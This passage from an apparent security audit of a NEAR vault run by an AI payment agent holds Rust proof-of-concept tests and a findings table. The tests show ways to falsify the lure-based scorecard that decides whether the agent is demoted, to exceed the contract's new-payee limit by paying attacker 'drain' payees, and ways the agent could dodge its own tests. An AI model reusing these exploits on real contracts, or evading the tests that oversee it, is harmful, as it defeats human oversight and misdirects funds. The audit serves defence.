    assert!(decline(&e, &inv(1).1).await, "agent correctly declines the only lure it ever saw");
    wait_until(&e, expires_s(&e, slot).await? + 1).await?;
    assert_eq!(reveal(&e, slot + 1, &ghost).await?, Ok("Unanswered".into()), "owner reveals the ghost first");
    assert_eq!(reveal(&e, slot, &delivered).await?, Ok("Invalid".into()), "the real pass is now a reused payee");
    let sc = scorecard(&e).await?;
    assert_eq!(sc["stats"]["passed"], 0);
    assert_eq!(sc["score_bps"], 0, "a perfect agent scores 0");
    Ok(())
}

// V2-03: approval is checked at reveal time, not decision time. The owner lists a passed lure's payee
// (even as pending), reveals it Invalid, then delists it. Only failures remain in the score.
#[tokio::test]
async fn v03_owner_discards_passes_with_add_then_remove_payee() -> anyhow::Result<()> {
    let e = setup(Opts { ttl_s: 20, payee_delay_s: 3600, ..Default::default() }).await?;
    let (p1, p2) = (implicit('c'), implicit('d'));
    let passed = Slot::lure(1, &p1, inv(1).0);
    let failed = Slot::lure(2, &p2, inv(2).0);
    let slot = commit(&e, &[Slot::lure(1, &p1, inv(1).0), Slot::lure(2, &p2, inv(2).0), Slot::void(3)]).await?;
    assert!(decline(&e, &inv(1).1).await);
    assert!(pay(&e, &inv(2).1, &p2, USDC).await);
    assert_eq!(reveal(&e, slot + 1, &failed).await?, Ok("Failed".into()));
    assert!(owner_call(&e, "add_payee", json!({ "account_id": p1, "label": "x" })).await?, "pending, active in 1 h");
    wait_until(&e, expires_s(&e, slot).await? + 1).await?;
    assert_eq!(reveal(&e, slot, &passed).await?, Ok("Invalid".into()), "the pass is discarded");
    assert!(owner_call(&e, "remove_payee", json!({ "account_id": p1 })).await?);
    assert!(view(&e, "get_payee_status", json!({ "account_id": p1 })).await?.is_null(), "no state left that explains Invalid");
    let sc = scorecard(&e).await?;
    assert_eq!(sc["score_bps"], 0, "honest score would be 5000");
    Ok(())
}

// V2-04: remove_payee is immediate and pay does not let the agent require approval atomically.
// The owner delists a payee between the agent's check and its pay, then reveals a slot on that payee.
#[tokio::test]
async fn v04_remove_payee_race_frames_an_approved_payment() -> anyhow::Result<()> {
    let e = setup(Opts::default()).await?;
    let vendor = "newvendor.test.near";
    let s = Slot::lure(1, vendor, inv(0x77).0); // invoice 0x77 is never delivered
    let slot = commit(&e, &[Slot::lure(1, vendor, inv(0x77).0), Slot::void(2), Slot::void(3)]).await?;
    assert!(owner_call(&e, "add_payee", json!({ "account_id": vendor, "label": "New Vendor Ltd" })).await?);
    let st = view(&e, "get_payee_status", json!({ "account_id": vendor })).await?;
    assert!(!st.is_null(), "agent checks: approved and active");
    assert!(owner_call(&e, "remove_payee", json!({ "account_id": vendor })).await?, "owner front-runs");
    assert!(pay(&e, &inv(0x50).1, vendor, USDC).await, "pay still succeeds");
    let d = view(&e, "get_decision", json!({ "invoice_id": inv(0x50).1 })).await?;
    assert_eq!(d["payee_approved"], false);
    assert_eq!(reveal(&e, slot, &s).await?, Ok("Failed".into()));
    assert_eq!(scorecard(&e).await?["mode"], "Demoted");
    Ok(())
}

// V2-05: the mirror of V2-03. A lure the agent paid is hidden by listing its payee before the reveal.
#[tokio::test]
async fn v05_owner_hides_failure_by_listing_lure_payee() -> anyhow::Result<()> {
    let e = setup(Opts { payee_delay_s: 3600, ..Default::default() }).await?;
    let p = implicit('e');
    let lure = Slot::lure(1, &p, inv(1).0);
    let slot = commit(&e, &[Slot::lure(1, &p, inv(1).0), Slot::void(2), Slot::void(3)]).await?;
    assert!(pay(&e, &inv(1).1, &p, USDC).await, "agent falls for the lure");
    assert!(owner_call(&e, "add_payee", json!({ "account_id": p, "label": "x" })).await?);
    assert_eq!(reveal(&e, slot, &lure).await?, Ok("Invalid".into()));
    assert!(owner_call(&e, "remove_payee", json!({ "account_id": p })).await?);
    let sc = scorecard(&e).await?;
    assert_eq!(sc["mode"], "Armed", "no demotion");
    assert_eq!(sc["stats"]["failed"], 0);
    Ok(())
}

// V2-06: ciphertext_sha256 is stored but never checked against the published ciphertexts.
#[tokio::test]
async fn v06_ciphertext_hash_not_verified() -> anyhow::Result<()> {
    let e = setup(Opts::default()).await?;
    let ttl_round = round_at(now_s(&e).await? + 60) - 1;
    let junk = vec!["bm90IGEgdGxvY2sgZmlsZQ==".to_string(); 3]; // "not a tlock file"
    commit_by(&e.owner, &e, &[Slot::void(1), Slot::void(2), Slot::void(3)], ttl_round, Some(junk)).await?;
    commit_by(&e.owner, &e, &[Slot::void(4), Slot::void(5), Slot::void(6)], ttl_round, None).await?;
    let t = view(&e, "get_test", json!({ "slot_id": 0 })).await?;
    assert_eq!(t["ciphertext_sha256"], hex::encode([0xcc; 32]), "hash of nothing that was published");
    Ok(())
}

// V2-07: commit_batch needs no deposit and the vault pays its storage, so the owner's FC key (tester host)
// converts vault NEAR into storage; get_scorecard grows linearly with batches.
#[tokio::test]
async fn v07_owner_fc_key_burns_vault_near_and_grows_scorecard() -> anyhow::Result<()> {
    let e = setup(Opts::default()).await?;
    let sk = SecretKey::from_random(KeyType::ED25519);
    e.owner
        .batch(e.owner.id())
        .add_key(sk.public_key(), AccessKey::function_call_access(e.shop.id(), &["commit_batch"], Some(NearToken::from_near(1))))
        .transact()
        .await?
        .into_result()?;
    let tester = Account::from_secret_key(e.owner.id().clone(), sk, &e.worker);
    let stranger = e.worker.dev_create_account().await?;
    let sc_gas = |r: &near_workspaces::result::ExecutionFinalResult| r.outcomes().iter().map(|o| o.gas_burnt.as_gas()).max().unwrap();

    let g0 = sc_gas(&stranger.call(e.shop.id(), "get_scorecard").gas(Gas::from_tgas(300)).transact().await?);
    let before = e.worker.view_account(e.shop.id()).await?;
    let n = 20u8;
    for i in 0..n {
        let round = round_at(now_s(&e).await? + 60);
        let s = [Slot::void(3 * i + 10), Slot::void(3 * i + 11), Slot::void(3 * i + 12)];
        commit_by(&tester, &e, &s, round, None).await?;
    }
    let after = e.worker.view_account(e.shop.id()).await?;
    let g1 = sc_gas(&stranger.call(e.shop.id(), "get_scorecard").gas(Gas::from_tgas(300)).transact().await?);
    let bytes = after.storage_usage - before.storage_usage;
    let per_batch_gas = (g1 - g0) / n as u64;
    println!(
        "{n} batches: +{bytes} bytes ({} B/batch, {} yoctoNEAR locked/batch); get_scorecard {g0} -> {g1} gas, {per_batch_gas} gas/batch, 300 Tgas at ~{} batches",
        bytes / n as u64,
        (bytes / n as u64) as u128 * BYTE_COST,
        300_000_000_000_000u64 / per_batch_gas.max(1)
    );
    assert!(bytes / n as u64 > 1000, "each K=3 batch locks >1 KB of vault NEAR");
    assert!(per_batch_gas > 0);
    Ok(())
}

// V2-08: propose records the payee as known. After re-arming, paying it skips storage_deposit and the
// new-payee limit: a self-registered attacker payee is paid beyond max_new_payees_per_day; an unregistered one fails.
#[tokio::test]
async fn v08_proposed_payee_skips_new_payee_limit_and_registration() -> anyhow::Result<()> {
    let e = setup(Opts::default()).await?;
    let lure = Slot::lure(1, &implicit('f'), inv(1).0);
    let slot = commit(&e, &[Slot::lure(1, &implicit('f'), inv(1).0), Slot::void(2), Slot::void(3)]).await?;
    assert!(pay(&e, &inv(1).1, &lure.payee, 1).await);
    assert_eq!(reveal(&e, slot, &lure).await?, Ok("Failed".into()));

    let stranger = e.worker.dev_create_account().await?;
    let attackers: Vec<String> = (0..6).map(|i| format!("drain{i}.test.near")).collect();
    for (i, a) in attackers.iter().enumerate() {
        assert!(agent_call(&e, "propose", json!({ "invoice_id": inv(100 + i as u8).1, "payee": a, "amount": "1" })).await);
        assert!(owner_call(&e, "reject", json!({ "proposal_id": i })).await?);
        stranger
            .call(e.ft.id(), "storage_deposit")
            .args_json(json!({ "account_id": a }))
            .deposit(NearToken::from_millinear(10))
            .transact()
            .await?
            .into_result()?;
    }
    assert!(agent_call(&e, "propose", json!({ "invoice_id": inv(120).1, "payee": "unregistered.test.near", "amount": "1" })).await);
    wait_until(&e, now_s(&e).await? + 2).await?;
    arm(&e.owner, &e.vendor, &e.shop, &e.agent_pk).await?;

    for (i, a) in attackers.iter().enumerate() {
        assert!(pay(&e, &inv(140 + i as u8).1, a, USDC / 2).await, "payee {i} of 6, limit is 5");
    }
    for a in &attackers {
        let b: String = e.ft.view("ft_balance_of").args_json(json!({ "account_id": a })).await?.json()?;
        assert_eq!(b, (USDC / 2).to_string());
    }
    assert!(pay(&e, &inv(160).1, "unregistered.test.near", 1).await);
    let pays = view(&e, "get_payments", json!({ "from": 0, "limit": 100 })).await?;
    let last = pays.as_array().unwrap().last().unwrap().clone();
    assert_eq!(last["status"], "Failed", "no storage_deposit for a payee that was only proposed");
    Ok(())
}

// V2-09 (Info): paying an approved payee under the lure invoice id scores Passed.
#[tokio::test]
async fn v09_paying_approved_payee_on_lure_invoice_passes() -> anyhow::Result<()> {
    let e = setup(Opts { ttl_s: 20, ..Default::default() }).await?;
    let lure = Slot::lure(1, &implicit('a'), inv(1).0);
    let slot = commit(&e, &[Slot::lure(1, &implicit('a'), inv(1).0), Slot::void(2), Slot::void(3)]).await?;
    assert!(owner_call(&e, "add_payee", json!({ "account_id": "acme.test.near", "label": "Acme" })).await?);
    assert!(pay(&e, &inv(1).1, "acme.test.near", 2 * USDC).await, "fake invoice paid to the real vendor");
    wait_until(&e, expires_s(&e, slot).await? + 1).await?;
    assert_eq!(reveal(&e, slot, &lure).await?, Ok("Passed".into()));
    Ok(())
}

// V2-10 (Info): a mixed set_limits (one tighter, one looser) queues the tightening too.
#[tokio::test]
async fn v10_mixed_set_limits_delays_the_tightening() -> anyhow::Result<()> {
    let e = setup(Opts::default()).await?;
    let mixed = json!({ "daily_cap": (50 * USDC).to_string(), "max_per_payment": "1", "max_new_payees_per_day": 5 });
    assert!(owner_call(&e, "set_limits", mixed).await?);
    assert!(pay(&e, &inv(1).1, "a.test.near", 2 * USDC).await, "max_per_payment=1 not in force for limits_delay");
    Ok(())
}

// Verification of v1 SS-C05 and SS-C09 fixes, plus storage numbers for V2-11.
#[tokio::test]
async fn verify_c05_c09_storage_and_events() -> anyhow::Result<()> {
    let e = setup(Opts { ttl_s: 20, ..Default::default() }).await?;
    let a0 = e.worker.view_account(e.shop.id()).await?;
    let r = e.agent.call(e.shop.id(), "decline")
        .args_json(json!({ "invoice_id": inv(1).1, "reason": "x".repeat(140) }))
        .gas(Gas::from_tgas(10)).transact().await?;
    assert!(r.is_success());
    let a1 = e.worker.view_account(e.shop.id()).await?;
    println!("one max decline: {} bytes, gas {}", a1.storage_usage - a0.storage_usage, r.total_gas_burnt.as_gas());
    assert!(!agent_call(&e, "decline", json!({ "invoice_id": inv(2).1, "reason": "x".repeat(141) })).await, "141 bytes rejected");
    for i in 0..49u8 {
        assert!(decline(&e, &inv(10 + i).1).await);
    }
    assert!(!decline(&e, &inv(200).1).await, "51st decision of the day rejected");

    let lure = Slot::lure(1, &implicit('a'), inv(1).0);
    let slot = commit(&e, &[Slot::lure(1, &implicit('a'), inv(1).0), Slot::void(2), Slot::void(3)]).await?;
    wait_until(&e, expires_s(&e, slot).await? + 1).await?;
    let b0 = e.worker.view_account(e.shop.id()).await?;
    assert!(reveal(&e, slot, &lure).await?.is_ok());
    let b1 = e.worker.view_account(e.shop.id()).await?;
    println!("one scored reveal: {} bytes", b1.storage_usage - b0.storage_usage);

    let w = e.owner.call(e.shop.id(), "withdraw").args_json(json!({ "amount": (1_000_000 * USDC).to_string() }))
        .deposit(YOCTO).gas(Gas::from_tgas(50)).transact().await?;
    let logs = w.logs().join("\n");
    assert!(logs.contains("\"ok\":false"), "Withdrawn now reports the transfer result: {logs}");
    Ok(())
}

// V2-12: once a payee was paid while listed, removing it makes it untestable: every later slot on it is
// Invalid, and the agent may keep paying the delisted account with no new-payee check.
#[tokio::test]
async fn v12_delisted_payee_cannot_be_tested() -> anyhow::Result<()> {
    let e = setup(Opts::default()).await?;
    let old = "oldbank.test.near";
    assert!(owner_call(&e, "add_payee", json!({ "account_id": old, "label": "Acme old bank" })).await?);
    assert!(pay(&e, &inv(1).1, old, USDC).await);
    assert!(owner_call(&e, "remove_payee", json!({ "account_id": old })).await?, "account compromised, delisted");
    let s = Slot::lure(1, old, inv(2).0);
    let slot = commit(&e, &[Slot::lure(1, old, inv(2).0), Slot::void(2), Slot::void(3)]).await?;
    assert!(pay(&e, &inv(2).1, old, USDC).await, "agent pays the delisted account on the lure");
    assert_eq!(reveal(&e, slot, &s).await?, Ok("Invalid".into()));
    assert_eq!(scorecard(&e).await?["mode"], "Armed");
    Ok(())
}
```

## 2.3.0 gas keys

2.3.0 lets the agent key be a function-call gas key (NEP-611, `Policy.key_nonces > 0`): the vault adds it with `Allowance::Unlimited` and funds it with `key_allowance` (at most 1 NEAR) in the same batch, so agent gas is paid from the key, not the vault. The same release closes the delivery half of V2-02 (`release`, `ack`, `reveal(.., delivery)`, `prove_delivery`, `TestStatus::Ignored`; design in v2/32).

| ID | Severity | Description | Status |
|:-|:-|:-|:-|
| V23-01 | Low | Anyone can overfund the agent gas key. `TransferToGasKey` passes the actor check like `Transfer` (nearcore `runtime/runtime/src/actions.rs`, `check_actor_permissions`), and `DeleteKey` refuses a gas key holding more than 1 NEAR (`runtime/runtime/src/access_keys.rs`, `delete_gas_key`, `GasKeyBalanceTooHigh`, `GasKeyInfo::MAX_BALANCE_TO_BURN`). No contract host function withdraws from a gas key (`near-vm-runner/src/logic/logic.rs` exposes only add and transfer-to), so the vault cannot drain it. A griefer who sends over 1 NEAR makes demotion's swap batch and `freeze`'s delete fail: the key keeps its methods on chain | ACCEPTED. Authority is unaffected: `assert_agent` checks mode and signer key, so a Demoted or Frozen vault still refuses `pay`. The griefer pays, and only the key holder can spend the balance down. A failed gas-key delete now keeps `stale_key` (unit test `failed_gas_key_delete_stays_stale`), so `resync_key` can retry once the balance is under 1 NEAR. A failed batch moves no vault NEAR |
| V23-02 | Medium | Found while building the delivery proof. `reveal` is permissionless and the preimage is public after the tlock round, so the agent could reveal its own undecided lure without a proof first and lock it in as `Unanswered` | FIXED. Permissionless `prove_delivery(slot_id, delivery)` upgrades an `Unanswered` slot to `Ignored`, so reveal order does not matter. Sandbox `delivered_and_acked_lure_is_ignored_and_scored` |
| V23-03 | Medium | Found with V23-02. `Ignored` records its invoice in `scored_decisions` with no decision behind it. The agent could then pay any other lure's payee under that invoice id: the touched-payee failure scores the same id and turns `Invalid`, with no demotion | FIXED. `assert_new_decision` also refuses an invoice already in `scored_decisions`. Passed and Failed ids always have a decision, so existing paths are unchanged. Same sandbox test |
| V23-04 | Medium | Owner-labelled future ticks and re-served invoices framed a pre-commit decline as `Ignored` (detail: v2/33) | FIXED. `check_delivery` refuses any invoice with a decision, at any time; `release` requires `release_at <= now`. Sandbox `v23_owner_cannot_frame_ignored`, unit `delivery_needs_an_undecided_invoice_and_an_able_agent` |
| V23-05 | Medium | `min_answer` 0 allowed last-second delivery (v2/33) | FIXED. `new` requires `test_ttl / 4 <= min_answer < test_ttl`, so the serde default 0 is refused. Unit `min_answer_bounds` |
| V23-06 | Medium | Acks spent `max_decisions_per_day` (v2/33) | FIXED. Acks have their own rolling 24 h budget of 48 and never touch the decision count. Unit `acks_have_their_own_daily_budget`, sandbox `v23_owner_cannot_frame_ignored` |
| V23-07 | Medium | `Ignored` ignored the mode; a freeze after the ack scored an agent that could not act (v2/33) | FIXED. `check_delivery` requires mode Armed or Demoted, `ack.key == agent_key`, `armed_at <= ack.at`, and no `frozen_at` (set by `freeze` and by a failed arming) in `(ack.at, deadline]`. Sandbox `v23_freeze_after_ack_cannot_score_ignored`, unit `delivery_needs_an_undecided_invoice_and_an_able_agent` |
| V23-08 | Low | Gas-key re-keys were funded from the float unchecked (v2/33) | FIXED. While Armed with a gas key, `reserve()` holds `key_allowance` for the demotion re-key; `accept_key` needs that on top of the key cost; `resync_key` checks free NEAR before re-adding a gas key. Unit `gas_key_rekey_is_reserved` |
| V23-09 | Low | Key-action gas grows with lanes (v2/33) | FIXED. `MAX_KEY_NONCES` is 64. Unit `gas_key_policy_bounds` |
| V23-10 | Low | `on_armed` dropped a surviving prior gas key from `stale_key` (v2/33) | FIXED as specified: with `key_nonces > 0`, `on_armed` keeps the prior key stale. The single-slot `stale_key` limits in v2/33 remain. Unit `arming_keeps_a_prior_gas_key_stale` |
| V23-11 | Low | Non-acking or mis-acking agent invisible (v2/33) | FIXED. `Stats.releases_posted`, `acks_matched`, `acks_mismatched`, shown in `get_scorecard`. Asserted in the delivery sandbox tests |
| V23-12 | Info | `test_revealed` can fire twice per slot (v2/33) | DOCUMENTED on the event; version unchanged |
| V23-13 | Info | On the Intents rail an `Err` from `ft_transfer_call` gives the amount back to the cap even if the token moved it (v2/33) | OPEN. A standard NEP-141 resolve does not fail in practice; the token is fixed at init |
| V23-14 | Info | V23-01 griefing costs about 1 yocto when the key already holds close to 1 NEAR (v2/33) | OPEN. Suggested fix in v2/33: cap gas-key `key_allowance` at 0.5 NEAR |

Full write-up of V23-04 to V23-14: [v2/33_audit_230.md](33_audit_230.md).
